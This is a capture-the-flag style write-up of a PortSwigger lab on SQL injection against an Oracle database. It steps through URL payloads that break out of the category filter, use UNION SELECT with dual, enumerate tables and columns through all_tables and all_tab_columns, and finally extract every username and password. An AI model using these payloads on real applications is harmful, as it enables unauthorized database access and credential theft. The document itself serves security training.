
# SQL injection attack, listing the database contents on Oracle

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.

Hint: On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual


---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/examining-the-database

- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------


We see there are 2 values displayed in the table, the description and the content of the post:



![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle/1.png)


We find these payload are valid to display the 4 posts in Gifts and the second all the items:

```
/filter?category=Pets'--
/filter?category=Pets'+or+1=1--
```

Also, that there are 2 columns returned by the query and we can do a UNION attack with the payload:

```
/filter?category=Pets'+union+all+select+NULL,NULL+from+dual--
```


List the table names with

```
SELECT table_name from all_tables
```

```
/filter?category=Pets'+union+all+select+'1',table_name+from+all_tables--
```



![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle/2.png)

The interesting one seems “USERS_XWRQEE”. 

```
SELECT COLUMN_NAME from all_tab_columns WHERE table_name = 'USERS_XWRQEE'
```

```
/filter?category=Pets'+union+all+select+'1',COLUMN_NAME+from+all_tab_columns+WHERE+table_name+=+'USERS_XWRQEE'--
```



![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle/3.png)

Finally:

```
SELECT USERNAME_KIWRQE,PASSWORD_OCABHB from USERS_XWRQEE
```

```
/filter?category=Pets'+union+all+select+USERNAME_KIWRQE,PASSWORD_OCABHB+from+USERS_XWRQEE--
```



![img](images/SQL%20injection%20attack,%20listing%20the%20database%20contents%20on%20Oracle/4.png)